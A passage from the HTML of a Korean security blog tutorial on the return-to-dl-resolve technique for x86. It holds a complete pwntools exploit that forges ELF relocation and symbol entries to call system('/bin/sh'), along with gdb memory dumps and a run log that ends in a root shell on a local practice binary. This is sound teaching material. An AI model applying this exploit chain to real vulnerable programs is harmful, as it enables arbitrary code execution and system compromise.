+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'info'</span>
+
+<span class="c1"># get section address
+</span><span class="n">addr_dynsym</span>     <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynsym'</span><span class="p">).</span><span class="n">header</span><span class="p">[</span><span class="s">'sh_addr'</span><span class="p">]</span>
+<span class="n">addr_dynstr</span>     <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynstr'</span><span class="p">).</span><span class="n">header</span><span class="p">[</span><span class="s">'sh_addr'</span><span class="p">]</span>
+<span class="n">addr_relplt</span>     <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.rel.plt'</span><span class="p">).</span><span class="n">header</span><span class="p">[</span><span class="s">'sh_addr'</span><span class="p">]</span>
+<span class="n">addr_plt</span>        <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.plt'</span><span class="p">).</span><span class="n">header</span><span class="p">[</span><span class="s">'sh_addr'</span><span class="p">]</span>
+<span class="n">addr_bss</span>        <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.bss'</span><span class="p">).</span><span class="n">header</span><span class="p">[</span><span class="s">'sh_addr'</span><span class="p">]</span>
+<span class="n">addr_plt_read</span>   <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+<span class="n">addr_got_read</span>   <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'.dynsym  : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_dynsym</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'.dynstr  : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_dynstr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'.rel.plt : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_relplt</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'.plt     : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_plt</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'.bss     : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_bss</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'read@plt : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_plt_read</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'read@got : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_got_read</span><span class="p">))</span>
+
+<span class="n">addr_pop3</span> <span class="o">=</span> <span class="mh">0x80484e9</span>
+<span class="n">addr_pop_ebp</span> <span class="o">=</span> <span class="mh">0x080484eb</span>
+<span class="n">addr_leave_ret</span> <span class="o">=</span> <span class="mh">0x08048458</span>
+
+<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x300</span>
+<span class="n">base_stage</span> <span class="o">=</span> <span class="n">addr_bss</span> <span class="o">+</span> <span class="n">stack_size</span>
+
+<span class="c1"># read(0,base_stage,100)
+</span><span class="n">buf1</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">62</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_plt_read</span><span class="p">)</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_pop3</span><span class="p">)</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_pop_ebp</span><span class="p">)</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+<span class="n">buf1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_leave_ret</span><span class="p">)</span>
+
+<span class="n">addr_fake_reloc</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">20</span>
+<span class="n">addr_fake_sym</span> <span class="o">=</span> <span class="n">addr_fake_reloc</span> <span class="o">+</span> <span class="mi">8</span>
+<span class="n">addr_fake_symstr</span> <span class="o">=</span> <span class="n">addr_fake_sym</span> <span class="o">+</span> <span class="mi">16</span>
+<span class="n">addr_fake_cmd</span> <span class="o">=</span> <span class="n">addr_fake_symstr</span> <span class="o">+</span> <span class="mi">7</span>
+
+<span class="n">fake_reloc_offset</span> <span class="o">=</span> <span class="n">addr_fake_reloc</span> <span class="o">-</span> <span class="n">addr_relplt</span> 
+<span class="n">fake_r_info</span> <span class="o">=</span> <span class="p">((</span><span class="n">addr_fake_sym</span> <span class="o">-</span> <span class="n">addr_dynsym</span><span class="p">)</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xFF</span>  <span class="c1"># Fake ELF32_R_SYM
+</span><span class="n">fake_r_info</span> <span class="o">=</span> <span class="n">fake_r_info</span> <span class="o">|</span> <span class="mh">0x7</span>       <span class="c1"># Fake ELF32_R_TYPE 
+</span><span class="n">fake_st_name</span> <span class="o">=</span> <span class="n">addr_fake_symstr</span> <span class="o">-</span> <span class="n">addr_dynstr</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'fake_reloc_offset : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_reloc_offset</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'fake_r_info       : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_r_info</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'fake_st_name      : '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_st_name</span><span class="p">))</span>
+
+<span class="c1"># .bss
+# _dl_runtime_resolve(struct link_map *l, fake_reloc_offset)
+</span><span class="n">buf2</span> <span class="o">=</span> <span class="s">'AAAA'</span>
+<span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_plt</span><span class="p">)</span>
+<span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">fake_reloc_offset</span><span class="p">)</span>
+<span class="n">buf2</span> <span class="o">+=</span> <span class="s">'BBBB'</span>
+<span class="c1"># Argument of the function
+</span><span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_fake_cmd</span><span class="p">)</span>
+<span class="c1">#Fake Elf32_Rel
+</span><span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_got_read</span><span class="p">)</span>
+<span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">fake_r_info</span><span class="p">)</span>
+<span class="c1">#Fake Elf32_Sym
+</span><span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">fake_st_name</span><span class="p">)</span>
+<span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">buf2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>
+<span class="c1">#String "system"
+</span><span class="n">buf2</span> <span class="o">+=</span> <span class="s">"system</span><span class="se">\x00</span><span class="s">"</span>
+<span class="c1">#String "/bin/sh"
+</span><span class="n">buf2</span> <span class="o">+=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)
+</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+
+<span class="c1">#raw_input('1')
+</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf1</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></table></code></div></div><p>.bss 영역 base_stage에 저장된 값.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>db-peda$ x/24wx 0x804a020 + 0x300
+0x804a320:  0x0000003b  0xf7f5b918  0x00002084 &lt;- fake_reloc_offset  0x42424242
+0x804a330:  0x0804a353  0x0804a00c  0x00021707  0x00002120
+0x804a340:  0x00000000  0x00000000  0x00000012  0x74737973
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">fake Elf32_Rel</code>을 가리키도록 <code class="language-plaintext highlighter-rouge">fake_reloc_offset</code>을 맞춰준다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>gdb-peda$ elfheader .rel.plt
+.rel.plt: 0x80482b0 - 0x80482c8 (rodata)
+gdb-peda$ x/24wx 0x80482b0 + 0x00002084
+0x804a334:  0x0804a00c  0x00021707 &lt;- fake Elf32_Rel  0x00002120    0x00000000
+0x804a344:  0x00000000  0x00000012  0x74737973  0x2f006d65
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">fake_r_info</code>의 <code class="language-plaintext highlighter-rouge">r_offset</code>을 더해주면 <code class="language-plaintext highlighter-rouge">Elf32_Sym</code>을 가리키도록 한다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>gdb-peda$ elfheader .dynsym
+.dynsym: 0x80481cc - 0x804822c (rodata)
+gdb-peda$ x/24wx 0x80481cc + 0x2170
+0x804a33c:  0x00002120  0x00000000  0x00000000  0x00000012
+0x804a34c:  0x74737973  0x2f006d65  0x2f6e6962  0x00006873
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">fake_st_name</code>을 가리키도록 <code class="language-plaintext highlighter-rouge">.dynstr</code>에서의 offset을 맞춰준다.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>gdb-peda$ elfheader .dynstr
+.dynstr: 0x804822c - 0x804827c (rodata)
+gdb-peda$ x/s 0x804822c + 0x00002120
+0x804a34c:  "system"
+</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre><td class="rouge-code"><pre>[----------------------------------registers-----------------------------------]
+EAX: 0x3b (';')
+EBX: 0x0 
+ECX: 0x804a320 --&gt; 0x3b (';')
+EDX: 0x64 ('d')
+ESI: 0x0 
+EDI: 0x804a320 --&gt; 0x3b (';')
+EBP: 0x41414141 ('AAAA')
+ESP: 0x804a31c --&gt; 0xf7e1b940 (&lt;system&gt;:    sub    esp,0xc)
+EIP: 0xf7fc7ffb (ret    0xc)
+EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+0xf7fc7ff1: mov    ecx,DWORD PTR [esp]
+0xf7fc7ff4: mov    DWORD PTR [esp],eax
+0xf7fc7ff7: mov    eax,DWORD PTR [esp+0x4]
+=&gt; 0xf7fc7ffb:  ret    0xc   &lt;--- 0xc 만큼 인자를 정리해준다.
+0xf7fc7ffe: xchg   ax,ax 
+0xf7fc8000: push   esp
+0xf7fc8001: add    DWORD PTR [esp],0x8
+0xf7fc8005: push   ebp
+[------------------------------------stack-------------------------------------]
+0000| 0x804a31c --&gt; 0xf7e1b940 (&lt;system&gt;:   sub    esp,0xc)
+0004| 0x804a320 --&gt; 0x3b (';')
+0008| 0x804a324 --&gt; 0xf7fd7918 --&gt; 0x0 
+0012| 0x804a328 --&gt; 0x2084 
+0016| 0x804a32c ("BBBBS\243\004\b\f\240\004\b\a\027\002")
+0020| 0x804a330 --&gt; 0x804a353 ("/bin/sh")
+0024| 0x804a334 --&gt; 0x804a00c --&gt; 0xf7e1b940 (&lt;system&gt;: sub    esp,0xc)
+0028| 0x804a338 --&gt; 0x21707 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xf7fc7ffb in ?? () from /lib/ld-linux.so.2
+gdb-peda$ x/24wx $esp
+0x804a31c:  0xf7e1b940 &lt;- system  0x0000003b    0xf7fd7918  0x00002084
+0x804a32c:  0x42424242  0x0804a353 &lt;- &amp;"/bin/sh"  0x0804a00c    0x00021707
+0x804a33c:  0x00002120  0x00000000  0x00000000  0x00000012
+0x804a34c:  0x74737973  0x2f006d65  0x2f6e6962  0x00006873
+0x804a35c:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804a36c:  0x00000000  0x00000000  0x00000000  0x00000000
+</pre></table></code></div></div><h2 id="exploit">Exploit</h2><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>root@bs-virtual-machine:~/pwnable/return-to-resolve# python exploit.py 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/pwnable/return-to-resolve/rop'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Section Headers
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> .dynsym  : 0x80481cc
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> .dynstr  : 0x804822c
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> .rel.plt : 0x80482b0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> .plt     : 0x80482f0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> .bss     : 0x804a020
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">read</span>@plt : 0x8048300
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">read</span>@got : 0x804a00c
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> fake_reloc_offset : 0x2084
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> fake_r_info       : 0x21707
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> fake_st_name      : 0x2120
+<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'/root/pwnable/return-to-resolve/rop'</span>: pid 4483
+Hello ROP
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span>
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">pwd</span>
+/root/pwnable/return-to-resolve
+<span class="nv">$ </span> 
+</pre></table></code></div></div><h2 id="references">References</h2><ul><li><a href="https://www.lazenca.net/display/TEC/01.Return-to-dl-resolve+-+x86">01.Return-to-dl-resolve - x86</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploitation/'>Exploitation</a>, <a href='/categories/stack/'>Stack</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploitation/" class="post-tag no-text-decoration" >exploitation</a> <a href="/tags/stack/" class="post-tag no-text-decoration" >stack</a> <a href="/tags/return-to-dl-resolve/" class="post-tag no-text-decoration" >return-to-dl-resolve</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Return-to-dl-resolve - x86 - BS Blog&url=https://beomsu317.github.io/posts/return-to-dl-resolve-x86/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Return-to-dl-resolve - x86 - BS Blog&u=https://beomsu317.github.io/posts/return-to-dl-resolve-x86/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Return-to-dl-resolve - x86 - BS Blog&url=https://beomsu317.github.io/posts/return-to-dl-resolve-x86/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/algorithm/">algorithm</a> <a class="post-tag" href="/tags/dynamic-programming/">dynamic programming</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/stack/">stack</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/dagger/">dagger</a> <a class="post-tag" href="/tags/house-of-series/">house of series</a> <a class="post-tag" href="/tags/return-oriented-programming/">return-oriented programming</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/return-to-dl-resolve-x64/"><div class="card-body"> <span class="timeago small" > Feb 12, 2020 <i class="unloaded">2020-02-12T00:00:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Return-to-dl-resolve - x64</h3><div class="text-muted small"><p> Description Lazy Binding을 악용해 원하는 함수를 호출하는 기법이다. x86과 비슷하지만 Elf32_Rel(8 byte), Elf32_Sym(16 byte) 대신 Elf64_Rela(24 byte), Elf64_Sym(24 byte) 구조를 사용한다. typedef uint64_t Elf64_Addr; typedef uint64_...</p></div></div></a></div><div class="card"> <a href="/posts/format-string-attack/"><div class="card-body"> <span class="timeago small" > Jan 30, 2020 <i class="unloaded">2020-01-30T00:00:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Format String Attack</h3><div class="text-muted small"><p> Description format string은 형태를 지정해주는 문자열을 의미한다. 형식지정자를 사용하지 않고 바로 printf() 함수에 인자를 입력받을 경우 발생하는 취약점이다. Proof of concept // Vuln Code // gcc fmt.c -m32 -fno-stack-protector -z execstack -no-pie -...</p></div></div></a></div><div class="card"> <a href="/posts/return-to-shellcode-arm/"><div class="card-body"> <span class="timeago small" > Feb 1, 2020 <i class="unloaded">2020-02-01T00:00:00+09:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Return-to-shellcode - arm</h3><div class="text-muted small"><p> Proof of concept #include &lt;stdio.h&gt; int main(){ char name[128]; printf("What's your name: "); gets(name); printf("Hello %s\n",name); } Exploit plan over...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/return-to-dl-resolve-x64/" class="btn btn-outline-primary" prompt="Older"><p>Return-to-dl-resolve - x64</p></a> <a href="/posts/return-oriented-programming-with-mmap/" class="btn btn-outline-primary" prompt="Newer"><p>Return-Oriented Programming with mmap</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/beomsu317">Beomsu Lee</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/algorithm/">algorithm</a> <a class="post-tag" href="/tags/dynamic-programming/">dynamic programming</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/stack/">stack</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/dagger/">dagger</a> <a class="post-tag" href="/tags/house-of-series/">house of series</a> <a class="post-tag" href="/tags/return-oriented-programming/">return oriented programming</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://beomsu317.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script>
